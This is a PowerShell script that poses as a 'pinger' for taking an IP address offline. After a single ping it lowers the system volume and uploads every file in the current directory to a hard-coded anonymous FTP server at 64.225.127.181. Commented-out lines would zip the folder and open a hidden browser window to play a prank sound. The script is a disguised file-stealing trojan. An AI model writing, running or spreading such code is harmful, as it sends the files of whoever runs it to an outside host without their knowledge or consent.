Write-Output ' __    __  __     ________  ______  __       __   ______   ________  ________        _______   ______  __    __   ______   ________  _______  '
Write-Output '/  |  /  |/  |   /        |/      |/  \     /  | /      \ /        |/        |      /       \ /      |/  \  /  | /      \ /        |/       \ '
Write-Output '$$ |  $$ |$$ |   $$$$$$$$/ $$$$$$/ $$  \   /$$ |/$$$$$$  |$$$$$$$$/ $$$$$$$$/       $$$$$$$  |$$$$$$/ $$  \ $$ |/$$$$$$  |$$$$$$$$/ $$$$$$$  |'
Write-Output '$$ |  $$ |$$ |      $$ |     $$ |  $$$  \ /$$$ |$$ |__$$ |   $$ |   $$ |__          $$ |__$$ |  $$ |  $$$  \$$ |$$ | _$$/ $$ |__    $$ |__$$ |'
Write-Output '$$ |  $$ |$$ |      $$ |     $$ |  $$$$  /$$$$ |$$    $$ |   $$ |   $$    |         $$    $$/   $$ |  $$$$  $$ |$$ |/    |$$    |   $$    $$< '
Write-Output '$$ |  $$ |$$ |      $$ |     $$ |  $$ $$ $$/$$ |$$$$$$$$ |   $$ |   $$$$$/          $$$$$$$/    $$ |  $$ $$ $$ |$$ |$$$$ |$$$$$/    $$$$$$$  |'
Write-Output '$$ \__$$ |$$ |_____ $$ |    _$$ |_ $$ |$$$/ $$ |$$ |  $$ |   $$ |   $$ |_____       $$ |       _$$ |_ $$ |$$$$ |$$ \__$$ |$$ |_____ $$ |  $$ |'
Write-Output '$$    $$/ $$       |$$ |   / $$   |$$ | $/  $$ |$$ |  $$ |   $$ |   $$       |      $$ |      / $$   |$$ | $$$ |$$    $$/ $$       |$$ |  $$ |'
Write-Output ' $$$$$$/  $$$$$$$$/ $$/    $$$$$$/ $$/      $$/ $$/   $$/    $$/    $$$$$$$$/       $$/       $$$$$$/ $$/   $$/  $$$$$$/  $$$$$$$$/ $$/   $$/ '
Write-Output '                                                                                                                                              '                                                                                                                                               
$ip = Read-Host "Enter in IP you wish to be taken offline?"
If ($ip -match "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" ) {Write-Host 'IP Address Detected'}
else {Write-Host 'You did no enter an IP'}

ping $ip -n 1 -w 1

Write-Output 'Checking if IP is down.....'
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'@

[audio]::Volume  = 0.1 #Make Sure to make this 0.9 again

$CurrentDir = (Get-Item -Path '.\' -Verbose).FullName
$destination = "ftp://64.225.127.181/"
$user = "anonymous"
$pass = "anonymous"

$webclient = New-Object System.Net.WebClient 

$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  

foreach($item in (dir $CurrentDir "*")){ 
    "Uploading $item..." 
    $uri = New-Object System.Uri($destination+$item.Name) 
    $webclient.UploadFile($uri, $item.FullName) 
 } 

#[void] (New-Item -Path $CurrentDir -Name "Lulz" -ItemType "directory")
#$Lulz = (Get-Item -Path '.\Lulz' -Verbose).FullName
#[void] (Copy-Item -Path $CurrentDir -Destination $Lulz -re

#Compress-Archive -Path $CurrentDir -DestinationPath ($CurrentLulz)+'lulz.zip' | Out-Null

#$ie = new-object -com "InternetExplorer.Application"
#$ie.visible = $false
#$ie.navigate("https://raw.githubusercontent.com/0x4rk0/PINGER/master/that%20really%20loud%20moaning%20sound%20on%20all%20of%20those%20facebook%20videos%20.mp3")

cmd /c pause